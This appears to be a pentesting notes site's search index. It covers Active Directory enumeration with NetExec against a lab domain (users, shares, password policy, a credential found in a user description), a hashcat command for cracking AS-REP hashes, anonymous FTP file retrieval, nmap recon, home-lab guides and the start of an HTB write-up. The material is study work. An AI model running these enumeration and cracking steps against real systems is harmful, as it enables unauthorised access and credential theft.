\nNORTH\\Administrator\nNORTH\\vagrant\nNORTH\\krbtgt\nNORTH\\SEVENKINGDOMS$\nNORTH\\arya.stark\nNORTH\\eddard.stark\nNORTH\\catelyn.stark\nNORTH\\robb.stark\nNORTH\\sansa.stark\nNORTH\\brandon.stark\nNORTH\\rickon.stark\nNORTH\\hodor\nNORTH\\jon.snow\nNORTH\\samwell.tarly\nNORTH\\jeor.mormont\nNORTH\\sql_svc\n</code></pre>"},{"location":"Pentesting-Notes/Windows/Pentesting/enumeration/#without-credentials","title":"Without Credentials","text":"<pre><code>nxc smb 10.10.10.11 --users\nSMB         10.10.10.11     445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)\nSMB         10.10.10.11     445    WINTERFELL       -Username-                    -Last PW Set-       -BadPW- -Description-              \nSMB         10.10.10.11     445    WINTERFELL       Guest                         &lt;never&gt;             0       Built-in account for guest access to the computer/domain\nSMB         10.10.10.11     445    WINTERFELL       arya.stark                    2025-10-31 23:47:19 0       Arya Stark \nSMB         10.10.10.11     445    WINTERFELL       sansa.stark                   2025-10-31 23:47:28 0       Sansa Stark \nSMB         10.10.10.11     445    WINTERFELL       brandon.stark                 2025-10-31 23:47:31 0       Brandon Stark \nSMB         10.10.10.11     445    WINTERFELL       rickon.stark                  2025-10-31 23:47:33 0       Rickon Stark \nSMB         10.10.10.11     445    WINTERFELL       hodor                         2025-10-31 23:47:35 0       Brainless Giant \nSMB         10.10.10.11     445    WINTERFELL       jon.snow                      2025-10-31 23:47:37 0       Jon Snow \nSMB         10.10.10.11     445    WINTERFELL       samwell.tarly                 2025-10-31 23:47:39 0       Samwell Tarly (Password : Heartsbane)\nSMB         10.10.10.11     445    WINTERFELL       jeor.mormont                  2025-10-31 23:47:41 0       Jeor Mormont \nSMB         10.10.10.11     445    WINTERFELL       sql_svc                       2025-10-31 23:47:43 0       sql service \nSMB         10.10.10.11     445    WINTERFELL       [*] Enumerated 10 local users: NORTH\n</code></pre>"},{"location":"Pentesting-Notes/Windows/Pentesting/enumeration/#with-credentials","title":"With Credentials","text":"<pre><code>nxc smb 10.10.10.11 -u 'samwell.tarly' -p 'Heartsbane' --users\nSMB         10.10.10.11     445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)\nSMB         10.10.10.11     445    WINTERFELL       -Username-                    -Last PW Set-       -BadPW- -Description-              \nSMB         10.10.10.11     445    WINTERFELL       Guest                         &lt;never&gt;             0       Built-in account for guest access to the computer/domain\nSMB         10.10.10.11     445    WINTERFELL       arya.stark                    2025-10-31 23:47:19 0       Arya Stark \nSMB         10.10.10.11     445    WINTERFELL       sansa.stark                   2025-10-31 23:47:28 0       Sansa Stark \nSMB         10.10.10.11     445    WINTERFELL       brandon.stark                 2025-10-31 23:47:31 0       Brandon Stark \nSMB         10.10.10.11     445    WINTERFELL       rickon.stark                  2025-10-31 23:47:33 0       Rickon Stark \nSMB         10.10.10.11     445    WINTERFELL       hodor                         2025-10-31 23:47:35 0       Brainless Giant \nSMB         10.10.10.11     445    WINTERFELL       jon.snow                      2025-10-31 23:47:37 0       Jon Snow \nSMB         10.10.10.11     445    WINTERFELL       samwell.tarly                 2025-10-31 23:47:39 0       Samwell Tarly (Password : Heartsbane)\nSMB         10.10.10.11     445    WINTERFELL       jeor.mormont                  2025-10-31 23:47:41 0       Jeor Mormont \nSMB         10.10.10.11     445    WINTERFELL       sql_svc                       2025-10-31 23:47:43 0       sql service \nSMB         10.10.10.11     445    WINTERFELL       [*] Enumerated 10 local users: NORTH\n</code></pre>"},{"location":"Pentesting-Notes/Windows/Pentesting/enumeration/#without-credentials-anonymous-access","title":"Without Credentials (Anonymous Access)","text":"<pre><code>nxc smb 10.10.10.23 -u 'a' -p '' --shares\nSMB         10.10.10.23     445    BRAAVOS          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:True)\nSMB         10.10.10.23     445    BRAAVOS          [+] essos.local\\a: (Guest)\nSMB         10.10.10.23     445    BRAAVOS          [*] Enumerated shares\nSMB         10.10.10.23     445    BRAAVOS          Share           Permissions     Remark\nSMB         10.10.10.23     445    BRAAVOS          -----           -----------     ------\nSMB         10.10.10.23     445    BRAAVOS          ADMIN$                          Remote Admin\nSMB         10.10.10.23     445    BRAAVOS          all             READ,WRITE      Basic RW share for all\nSMB         10.10.10.23     445    BRAAVOS          C$                              Default share\nSMB         10.10.10.23     445    BRAAVOS          CertEnroll                      Active Directory Certificate Services share\nSMB         10.10.10.23     445    BRAAVOS          IPC$                            Remote IPC\nSMB         10.10.10.23     445    BRAAVOS          public                          Basic Read share for all domain users\n</code></pre>"},{"location":"Pentesting-Notes/Windows/Pentesting/enumeration/#with-credentials_1","title":"With Credentials","text":"<pre><code>nxc smb 10.10.10.11 -u 'samwell.tarly' -p 'Heartsbane' --shares\nSMB         10.10.10.11     445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)\nSMB         10.10.10.11     445    WINTERFELL       [+] north.sevenkingdoms.local\\samwell.tarly:Heartsbane \nSMB         10.10.10.11     445    WINTERFELL       [*] Enumerated shares\nSMB         10.10.10.11     445    WINTERFELL       Share           Permissions     Remark\nSMB         10.10.10.11     445    WINTERFELL       -----           -----------     ------\nSMB         10.10.10.11     445    WINTERFELL       ADMIN$                          Remote Admin\nSMB         10.10.10.11     445    WINTERFELL       C$                              Default share\nSMB         10.10.10.11     445    WINTERFELL       IPC$            READ            Remote IPC\nSMB         10.10.10.11     445    WINTERFELL       NETLOGON        READ            Logon server share \nSMB         10.10.10.11     445    WINTERFELL       SYSVOL          READ            Logon server share \n</code></pre>"},{"location":"Pentesting-Notes/Windows/Pentesting/enumeration/#group-enumeration","title":"Group Enumeration","text":"<pre><code>nxc ldap 10.10.10.11 -u 'samwell.tarly' -p 'Heartsbane' --groups       \nSMB         10.10.10.11     445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)\nLDAP        10.10.10.11     389    WINTERFELL       [+] north.sevenkingdoms.local\\samwell.tarly:Heartsbane \nLDAP        10.10.10.11     389    WINTERFELL       Administrators\nLDAP        10.10.10.11     389    WINTERFELL       Users\nLDAP        10.10.10.11     389    WINTERFELL       Guests\nLDAP        10.10.10.11     389    WINTERFELL       Print Operators\nLDAP        10.10.10.11     389    WINTERFELL       Backup Operators\nLDAP        10.10.10.11     389    WINTERFELL       Replicator\nLDAP        10.10.10.11     389    WINTERFELL       Remote Desktop Users\nLDAP        10.10.10.11     389    WINTERFELL       Network Configuration Operators\nLDAP        10.10.10.11     389    WINTERFELL       Performance Monitor Users\nLDAP        10.10.10.11     389    WINTERFELL       Performance Log Users\nLDAP        10.10.10.11     389    WINTERFELL       Distributed COM Users\nLDAP        10.10.10.11     389    WINTERFELL       IIS_IUSRS\nLDAP        10.10.10.11     389    WINTERFELL       Cryptographic Operators\nLDAP        10.10.10.11     389    WINTERFELL       Event Log Readers\nLDAP        10.10.10.11     389    WINTERFELL       Certificate Service DCOM Access\nLDAP        10.10.10.11     389    WINTERFELL       RDS Remote Access Servers\n&lt;&lt; SNIP  FOR BREVITY &gt;&gt;\n</code></pre>"},{"location":"Pentesting-Notes/Windows/Pentesting/enumeration/#crack-the-hash-using-hashcat","title":"Crack the hash using Hashcat","text":"<pre><code>hashcat -m 18200 output.txt /usr/share/wordlists/rockyou.txt \n</code></pre>"},{"location":"Pentesting-Notes/Windows/Pentesting/enumeration/#without-creds-rare","title":"Without Creds (Rare)","text":"<pre><code>nxc smb 10.10.10.11 --pass-pol\nSMB         10.10.10.11     445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)\nSMB         10.10.10.11     445    WINTERFELL       [+] Dumping password info for domain: NORTH\nSMB         10.10.10.11     445    WINTERFELL       Minimum password length: 5\nSMB         10.10.10.11     445    WINTERFELL       Password history length: 24\nSMB         10.10.10.11     445    WINTERFELL       Maximum password age: 311 days 2 minutes \nSMB         10.10.10.11     445    WINTERFELL       \nSMB         10.10.10.11     445    WINTERFELL       Password Complexity Flags: 000000\nSMB         10.10.10.11     445    WINTERFELL           Domain Refuse Password Change: 0\nSMB         10.10.10.11     445    WINTERFELL           Domain Password Store Cleartext: 0\nSMB         10.10.10.11     445    WINTERFELL           Domain Password Lockout Admins: 0\nSMB         10.10.10.11     445    WINTERFELL           Domain Password No Clear Change: 0\nSMB         10.10.10.11     445    WINTERFELL           Domain Password No Anon Change: 0\nSMB         10.10.10.11     445    WINTERFELL           Domain Password Complex: 0\nSMB         10.10.10.11     445    WINTERFELL       \nSMB         10.10.10.11     445    WINTERFELL       Minimum password age: 1 day 4 minutes \nSMB         10.10.10.11     445    WINTERFELL       Reset Account Lockout Counter: 5 minutes \nSMB         10.10.10.11     445    WINTERFELL       Locked Account Duration: 5 minutes \nSMB         10.10.10.11     445    WINTERFELL       Account Lockout Threshold: 5\nSMB         10.10.10.11     445    WINTERFELL       Forced Log off Time: Not Set\n</code></pre>"},{"location":"Pentesting-Notes/Windows/Pentesting/enumeration/#with-credentials_2","title":"With Credentials","text":"<pre><code>nxc smb 10.10.10.11 -u 'samwell.tarly' -p 'Heartsbane' --pass-pol\nSMB         10.10.10.11     445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)\nSMB         10.10.10.11     445    WINTERFELL       [+] north.sevenkingdoms.local\\samwell.tarly:Heartsbane \nSMB         10.10.10.11     445    WINTERFELL       [+] Dumping password info for domain: NORTH\nSMB         10.10.10.11     445    WINTERFELL       Minimum password length: 5\nSMB         10.10.10.11     445    WINTERFELL       Password history length: 24\nSMB         10.10.10.11     445    WINTERFELL       Maximum password age: 311 days 2 minutes \nSMB         10.10.10.11     445    WINTERFELL       \nSMB         10.10.10.11     445    WINTERFELL       Password Complexity Flags: 000000\nSMB         10.10.10.11     445    WINTERFELL           Domain Refuse Password Change: 0\nSMB         10.10.10.11     445    WINTERFELL           Domain Password Store Cleartext: 0\nSMB         10.10.10.11     445    WINTERFELL           Domain Password Lockout Admins: 0\nSMB         10.10.10.11     445    WINTERFELL           Domain Password No Clear Change: 0\nSMB         10.10.10.11     445    WINTERFELL           Domain Password No Anon Change: 0\nSMB         10.10.10.11     445    WINTERFELL           Domain Password Complex: 0\nSMB         10.10.10.11     445    WINTERFELL       \nSMB         10.10.10.11     445    WINTERFELL       Minimum password age: 1 day 4 minutes \nSMB         10.10.10.11     445    WINTERFELL       Reset Account Lockout Counter: 5 minutes \nSMB         10.10.10.11     445    WINTERFELL       Locked Account Duration: 5 minutes \nSMB         10.10.10.11     445    WINTERFELL       Account Lockout Threshold: 5\nSMB         10.10.10.11     445    WINTERFELL       Forced Log off Time: Not Set\n</code></pre>"},{"location":"Pentesting-Notes/Windows/Pentesting/kerberos/","title":"Kerberos","text":""},{"location":"Pentesting-Notes/Windows/Pentesting/reconnaissance/","title":"Sniffing out a Target","text":""},{"location":"Pentesting-Notes/Windows/Pentesting/reconnaissance/#sniffing-out-a-target","title":"Sniffing out a Target","text":"<p>When beginning a penetration test, gathering information about the target is crucial. This process, known as reconnaissance, helps identify potential vulnerabilities and entry points. Here are some common techniques and tools used for reconnaissance on Windows systems:</p> <p>Using fping</p> <pre><code>fping -agq 10.10.10.0/24 \n10.10.10.10\n10.10.10.11\n10.10.10.12\n10.10.10.22\n10.10.10.23\n10.10.10.128\n</code></pre> Using nmap <p>Use tools like Nmap to scan the target network for open ports and services. This helps identify which services are running and potentially exploitable.</p> <pre><code>nmap -sS -sV -O &lt;target_ip&gt;\n</code></pre> <p><code>OS Fingerprinting</code>: Determine the operating system of the target machine using tools like Nmap or Xprobe2. This information can help tailor your attack strategies.</p> <pre><code>nmap -O &lt;target_ip&gt;\n</code></pre> <p><code>Service Enumeration</code>: Identify and enumerate services running on the target machine. Tools like Netcat, Telnet, or specific service enumeration tools (e.g., SMBEnum for SMB services) can be useful.</p> <pre><code>nmap -sV &lt;target_ip&gt;\n</code></pre> <p><code>Vulnerability Scanning</code>: Using the <code>-sC</code> option in Nmap enables the default scripts, which can help identify common vulnerabilities and misconfigurations on the target system.</p> <pre><code>nmap -sC &lt;target_ip&gt;\n</code></pre> NetExec <p>NetExec (a.k.a nxc) is a network service exploitation tool that helps automate assessing the security of large networks.</p>"},{"location":"Pentesting-Notes/Windows/Pentesting/reconnaissance/#host-discovery","title":"Host Discovery","text":"<pre><code>nxc smb 10.10.10.0/24                                                                           \nSMB         10.10.10.12     445    MEEREEN          [*] Windows 10 / Server 2016 Build 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True) \nSMB         10.10.10.10     445    KINGSLANDING     [*] Windows 10 / Server 2019 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:False)\nSMB         10.10.10.11     445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)\nSMB         10.10.10.22     445    CASTELBLACK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)\nSMB         10.10.10.23     445    BRAAVOS          [*] Windows 10 / Server 2016 Build 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:True) \nRunning nxc against 256 targets \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501 100% 0:00:00\n</code></pre>"},{"location":"Pentesting-Notes/Windows/Pentesting/reconnaissance/#anonymous-access-smb","title":"Anonymous Access (SMB)","text":"<p>Check for anonymous access to services like SMB, FTP, or databases. This can provide valuable information without needing credentials.</p> <pre><code>nxc smb 10.10.10.23 -u 'a' -p '' --shares\nSMB         10.10.10.23     445    BRAAVOS          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:True)\nSMB         10.10.10.23     445    BRAAVOS          [+] essos.local\\a: (Guest)\nSMB         10.10.10.23     445    BRAAVOS          [*] Enumerated shares\nSMB         10.10.10.23     445    BRAAVOS          Share           Permissions     Remark\nSMB         10.10.10.23     445    BRAAVOS          -----           -----------     ------\nSMB         10.10.10.23     445    BRAAVOS          ADMIN$                          Remote Admin\nSMB         10.10.10.23     445    BRAAVOS          all             READ,WRITE      Basic RW share for all\nSMB         10.10.10.23     445    BRAAVOS          C$                              Default share\nSMB         10.10.10.23     445    BRAAVOS          CertEnroll                      Active Directory Certificate Services share\nSMB         10.10.10.23     445    BRAAVOS          IPC$                            Remote IPC\nSMB         10.10.10.23     445    BRAAVOS          public                          Basic Read share for all domain users\n</code></pre>"},{"location":"Pentesting-Notes/Windows/Pentesting/reconnaissance/#anonymous-access-ftp","title":"Anonymous Access (FTP)","text":"<pre><code>nxc ftp 10.1.98.83 -u '' -p ''  \nFTP         10.1.98.83      21     10.1.98.83       [*] Banner: (vsFTPd 3.0.5)\nFTP         10.1.98.83      21     10.1.98.83       [+] : - Anonymous Login!\n\n\nnxc ftp 10.1.98.83 -u '' -p '' --ls\nFTP         10.1.98.83      21     10.1.98.83       [*] Banner: (vsFTPd 3.0.5)\nFTP         10.1.98.83      21     10.1.98.83       [+] : - Anonymous Login!\nFTP         10.1.98.83      21     10.1.98.83       [*] Directory Listing\nFTP         10.1.98.83      21     10.1.98.83       -rw-r--r--  10  0  202 Sep 21 00:04 pwlist.txt\n\nnxc ftp 10.1.98.83 -u '' -p '' --get pwlist.txt\nFTP         10.1.98.83      21     10.1.98.83       [*] Banner: (vsFTPd 3.0.5)\nFTP         10.1.98.83      21     10.1.98.83       [+] : - Anonymous Login!\nFTP         10.1.98.83      21     10.1.98.83       [+] Downloaded: pwlist.txt\n</code></pre>"},{"location":"PwnLabs/","title":"Coming soon","text":""},{"location":"PwnLabs/#coming-soon","title":"Coming soon","text":""},{"location":"TryHackme/","title":"Coming soon !!!","text":""},{"location":"TryHackme/#coming-soon","title":"Coming soon !!!","text":""},{"location":"blog/","title":"Blog","text":""},{"location":"blog/#blog","title":"Blog","text":""},{"location":"blog/2024/06/11/networking-fundamental/","title":"Networking Fundamental","text":""},{"location":"blog/2024/06/11/networking-fundamental/#osi-model-the-seven-layers-of-networking","title":"OSI Model: The Seven Layers of Networking","text":"<p>The OSI (Open Systems Interconnection) model is a conceptual framework used to understand and implement network protocols in seven distinct layers. Each layer serves a specific function and communicates with the layers directly above and below it. Here are the seven layers of the OSI model: </p> Physical Layer (Layer 1) <p>This layer is responsible for the physical connection between devices, including cables, switches, and other hardware. It deals with the transmission and reception of raw bit streams over a physical medium.</p> Data Link Layer (Layer 2) <p>This layer provides error detection and correction for data transmitted over the physical layer. It is responsible for framing, addressing (using MAC addresses), and managing access to the physical medium.</p> Network Layer (Layer 3) <p>The network layer is responsible for routing data packets between devices across different networks. It uses logical addressing (such as IP addresses) to determine the best path for data transmission.</p> Transport Layer (Layer 4) <p>This layer ensures reliable data transfer between devices. It manages end-to-end communication, error recovery, and flow control. Common protocols at this layer include TCP (Transmission Control Protocol) and UDP (User Datagram Protocol).</p> Session Layer (Layer 5) <p>The session layer manages sessions or connections between applications. It establishes, maintains, and terminates connections, ensuring that data is properly synchronized and organized.</p> Presentation Layer (Layer 6) <p>This layer is responsible for data translation, encryption, and compression. It ensures that data is presented in a format that the application layer can understand, regardless of the underlying system architecture.</p> Application Layer (Layer 7) <p>The application layer is the closest to the end user and provides network services directly to applications. It includes protocols such as HTTP, FTP, SMTP, and DNS, which facilitate various types of communication over the network.</p> <p>Understanding the OSI model is essential for network design, troubleshooting, and security, as it provides a structured approach to analyzing and managing network interactions.   </p>"},{"location":"blog/2024/06/11/networking-fundamental/#diagram","title":"Diagram","text":""},{"location":"blog/2024/10/07/active-directory-attacks/","title":"Active Directory Attacks","text":""},{"location":"blog/2024/10/07/active-directory-attacks/#active-directory-attacks","title":"Active Directory Attacks","text":"<p>This section covers various attacks that can be performed against Active Directory (AD) environments. AD is a widely used directory service in Windows-based networks, and understanding these attacks is crucial for securing such environments.</p>"},{"location":"blog/2024/10/07/active-directory-attacks/#table-of-contents","title":"Table of Contents","text":"<ul> <li>Introduction to Active Directory Attacks</li> <li>Common Active Directory Attacks</li> <li>Detection and Mitigation Strategies</li> <li>Conclusion</li> <li>References</li> </ul>"},{"location":"blog/2024/10/07/active-directory-attacks/#introduction-to-active-directory-attacks","title":"Introduction to Active Directory Attacks","text":"<p>Active Directory (AD) is a critical component of many enterprise networks, providing authentication and authorization services. Due to its central role, AD is a prime target for attackers seeking to gain unauthorized access or escalate privileges within a network. This document explores common AD attacks, their methodologies, and strategies for detection and mitigation.</p>"},{"location":"blog/2024/10/07/active-directory-attacks/#common-active-directory-attacks","title":"Common Active Directory Attacks","text":""},{"location":"blog/2024/10/07/active-directory-attacks/#1-pass-the-hash-pth","title":"1. Pass-the-Hash (PtH)","text":"<p>Pass-the-Hash is an attack technique where an attacker captures the hashed password of a user and uses it to authenticate without needing to know the actual password. This is often done by extracting hashes from memory or the SAM database.</p>"},{"location":"blog/2024/10/07/active-directory-attacks/#2-kerberoasting","title":"2. Kerberoasting","text":"<p>Kerberoasting involves requesting service tickets for service accounts in AD and then attempting to crack the ticket offline to retrieve the plaintext password. This attack targets service accounts that often have elevated privileges.</p>"},{"location":"blog/2024/10/07/active-directory-attacks/#3-golden-ticket-attack","title":"3. Golden Ticket Attack","text":"<p>A Golden Ticket attack involves creating a forged Kerberos Ticket Granting Ticket (TGT) using the KRBTGT account's hash. This allows attackers to impersonate any user in the domain, including domain administrators.</p>"},{"location":"blog/2024/10/07/active-directory-attacks/#4-silver-ticket-attack","title":"4. Silver Ticket Attack","text":"<p>Similar to the Golden Ticket attack, the Silver Ticket attack involves forging service tickets (TGS) for specific services. This attack is less powerful than the Golden Ticket but can still provide access to targeted services.</p>"},{"location":"blog/2024/10/07/active-directory-attacks/#5-dcsync-attack","title":"5. DCSync Attack","text":"<p>DCSync is an attack that allows an attacker to simulate the behavior of a domain controller and request password hashes and other sensitive information from AD. This is typically done using tools like Mimikatz.</p>"},{"location":"blog/2024/10/07/active-directory-attacks/#6-ldap-injection","title":"6. LDAP Injection","text":"<p>LDAP Injection is a technique where an attacker exploits vulnerabilities in applications that interact with AD via LDAP queries. By injecting malicious LDAP statements, attackers can manipulate queries to gain unauthorized access or extract sensitive information.</p>"},{"location":"blog/2024/10/07/active-directory-attacks/#7-sid-history-injection","title":"7. SID History Injection","text":"<p>SID History Injection involves adding a malicious Security Identifier (SID) to a user's SID history attribute. This can allow the user to inherit permissions from another account, potentially escalating privileges.</p>"},{"location":"blog/2024/10/07/active-directory-attacks/#detection-and-mitigation-strategies","title":"Detection and Mitigation Strategies","text":""},{"location":"blog/2024/10/07/active-directory-attacks/#detection","title":"Detection","text":"<ul> <li>Monitor for unusual authentication patterns, such as multiple failed login attempts or logins from unexpected locations.</li> <li>Use Security Information and Event Management (SIEM) systems to analyze logs for signs of PtH, Kerberoasting, and other AD attacks.</li> <li>Implement honeypots to detect unauthorized access attempts.</li> </ul>"},{"location":"blog/2024/10/07/active-directory-attacks/#mitigation","title":"Mitigation","text":"<ul> <li>Enforce strong password policies and use multi-factor authentication (MFA) to reduce the risk of credential theft.</li> <li>Regularly update and patch AD servers and related infrastructure to mitigate vulnerabilities.</li> <li>Limit the use of privileged accounts and implement the principle of least privilege.              </li> </ul>"},{"location":"blog/2025/12/18/building-a-cybersecurity-home-lab-in-virtualbox/","title":"Building a Cybersecurity Home Lab in VirtualBox","text":""},{"location":"blog/2025/12/18/building-a-cybersecurity-home-lab-in-virtualbox/#building-a-cybersecurity-home-lab-in-virtualbox","title":"Building a Cybersecurity Home Lab in VirtualBox","text":""},{"location":"blog/2025/12/18/building-a-cybersecurity-home-lab-in-virtualbox/#prequisites","title":"Prequisites","text":"<p>Below are links to get the following software(s) to get started. Feel free to surf the internet for for alternatives. Up to you.</p> <ul> <li> Oracle virtualBox</li> <li> Pfsense Community Edition</li> <li> Kali Linux </li> <li> Windows Server 2022 | Microsoft Eval Center</li> <li> Windows Server 2019 | Microsoft Eval Center</li> <li> Wazuh</li> <li> Ubuntu Download</li> <li> Docker Hub</li> </ul>"},{"location":"blog/2025/12/18/building-a-cybersecurity-home-lab-in-virtualbox/#required-knowledge","title":"Required knowledge.","text":"<ul> <li>Some basic knowledge of Operating systems (Windows, Linux)</li> <li>Some networking concepts</li> <li>Basic knowledge of the Command-line</li> <li>Some Docker/containerization knowledge</li> <li>Some cybersecurity knowledge</li> </ul>"},{"location":"blog/2025/12/10/building-a-proxmox-cybersecurity-home-lab/","title":"Building a Proxmox Cybersecurity Home Lab","text":""},{"location":"blog/2025/12/10/building-a-proxmox-cybersecurity-home-lab/#building-a-proxmox-cybersecurity-home-lab","title":"Building a Proxmox Cybersecurity Home Lab","text":"<p>This guide provides step-by-step instructions to set up a Proxmox home lab tailored for cybersecurity enthusiasts. It covers the installation of Proxmox VE, configuration of virtual machines, and best practices for creating a secure and efficient lab environment.</p> <p></p>"},{"location":"blog/2025/12/10/building-a-proxmox-cybersecurity-home-lab/#table-of-contents","title":"Table of Contents","text":"<ul> <li>Introduction</li> <li>Prerequisites</li> <li>Installing Proxmox VE</li> <li>Configuring Proxmox VE</li> <li>Creating Virtual Machines</li> <li>Networking Setup </li> <li>Security Best Practices</li> <li>Conclusion</li> </ul>"},{"location":"blog/2025/12/10/building-a-proxmox-cybersecurity-home-lab/#introduction","title":"Introduction","text":"<p>A Proxmox home lab provides a versatile platform for learning and experimenting with various cybersecurity tools and techniques. By leveraging virtualization, users can create isolated environments to test vulnerabilities, practice penetration testing, and simulate attacks without risking their primary systems.   </p>"},{"location":"blog/2025/12/10/building-a-proxmox-cybersecurity-home-lab/#prerequisites","title":"Prerequisites","text":"<p>Before starting, ensure you have the following: - A computer with at least 8GB of RAM and a multi-core processor. - A minimum of 100GB of free disk space. - A USB drive (at least 4GB) for Proxmox installation media. - A stable internet connection for downloading Proxmox VE and updates. - Basic knowledge of networking and virtualization concepts.</p>"},{"location":"blog/2025/12/10/building-a-proxmox-cybersecurity-home-lab/#installing-proxmox-ve","title":"Installing Proxmox VE","text":"<ol> <li>Download the latest Proxmox VE ISO from the official Proxmox website.</li> <li>Create a bootable USB drive using tools like Rufus or Etcher.</li> <li>Boot your computer from the USB drive and follow the on-screen instructions to install Proxmox VE.</li> <li>After installation, access the Proxmox web interface by navigating to <code>https://&lt;your-server-ip&gt;:8006</code> in your web browser.</li> <li>Log in using the root account and the password you set during installation.</li> </ol>"},{"location":"blog/2025/12/10/building-a-proxmox-cybersecurity-home-lab/#configuring-proxmox-ve","title":"Configuring Proxmox VE","text":"<ol> <li>Update Proxmox VE to the latest version by running the following commands in the terminal:    <pre><code>apt update\napt upgrade -y\n</code></pre></li> <li>Configure storage by adding local or network storage options in the Proxmox web interface.</li> <li>Set up backups to ensure your virtual machines and configurations are safe.</li> </ol>"},{"location":"blog/2025/12/10/building-a-proxmox-cybersecurity-home-lab/#creating-virtual-machines","title":"Creating Virtual Machines","text":"<ol> <li>In the Proxmox web interface, click on \"Create VM\" to start the virtual machine creation wizard.</li> <li>Choose a name for your VM and select the appropriate OS type (e.g., Linux, Windows).</li> <li>Allocate resources such as CPU, RAM, and disk space based on your requirements.</li> <li>Install the operating system by mounting an ISO image or using a network installation method.</li> <li>Repeat the process to create multiple VMs for different cybersecurity tools and environments.</li> </ol>"},{"location":"blog/2025/12/10/building-a-proxmox-cybersecurity-home-lab/#networking-setup","title":"Networking Setup","text":"<ol> <li>Configure virtual networks to isolate different VMs and simulate real-world network scenarios.</li> <li>Use Proxmox's built-in firewall to create rules that control traffic between VMs.</li> <li>Set up NAT or bridged networking based on your lab requirements.     </li> </ol>"},{"location":"blog/2025/12/10/building-a-proxmox-cybersecurity-home-lab/#security-best-practices","title":"Security Best Practices","text":"<ol> <li>Regularly update Proxmox VE and all installed VMs to patch vulnerabilities.</li> <li>Use strong passwords and enable two-factor authentication for Proxmox access.</li> <li>Limit access to the Proxmox web interface by configuring firewall rules.</li> <li>Monitor logs and network traffic for any suspicious activity.</li> <li>Create snapshots of VMs before making significant changes to easily revert if needed.</li> </ol>"},{"location":"blog/2025/12/10/building-a-proxmox-cybersecurity-home-lab/#conclusion","title":"Conclusion","text":"<p>Setting up a Proxmox cybersecurity home lab is an excellent way to enhance your skills and knowledge in a controlled environment. By following this guide, you can create a versatile and secure lab that allows you to experiment with various cybersecurity tools and techniques safely. Happy learning!  </p>"},{"location":"htb/","title":"Hack The Box Lab Notes","text":""},{"location":"htb/#easy-boxes","title":"Easy Boxes","text":"<ul> <li> Bastion</li> <li> Forest</li> <li> Cicada</li> <li> Editor</li> </ul>"},{"location":"htb/labs/","title":"List of HTB Labs","text":""},{"location":"htb/labs/#list-of-htb-labs","title":"List of HTB Labs","text":""},{"location":"htb/labs/#easy","title":"Easy","text":"Lab Name Writeup Link Bastion Retire Writeup Easy 2 Writeup Easy 3 Writeup"},{"location":"htb/labs/easy/Editor-active/","title":"Editor","text":""},{"location":"htb/labs/easy/Editor-active/#editor","title":"Editor","text":""},{"location":"htb/labs/easy/Editor-active/#ip-address-10101180","title":"IP Address = 10.10.11.80","text":"<pre><code>echo \"10.10.11.80 editor.htb\" | sudo tee -a /etc/hosts\n</code></pre>"},{"location":"htb/labs/easy/Editor-active/#enumeration","title":"Enumeration","text":"<pre><code>nmap 10.10.11.80 -sCV    \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-10-15 15:58 EDT\nNmap scan report for editor.htb (10.10.11.80)\nHost is up (0.037s latency).\nNot shown: 997 closed tcp ports (reset)\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)\n|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)\n80/tcp   open  http    nginx 1.18.0 (Ubuntu)\n|_http-server-header: nginx/1.18.0 (Ubuntu)\n|_http-title: Editor - SimplistCode Pro\n8080/tcp open  http    Jetty 10.0.20\n| http-methods: \n|_  Potentially risky methods: PROPFIND LOCK UNLOCK\n|_http-open-proxy: Proxy might be redirecting requests\n| http-cookie-flags: \n|   /: \n|     JSESSIONID: \n|_      httponly flag not set\n|_http-server-header: Jetty(10.0.20)\n| http-webdav-scan: \n|   WebDAV type: Unknown\n|   Server Type: Jetty(10.0.20)\n|_  Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK\n| http-robots.txt: 50 disallowed entries (15 shown)\n| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/ \n| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/ \n| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/ \n| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ 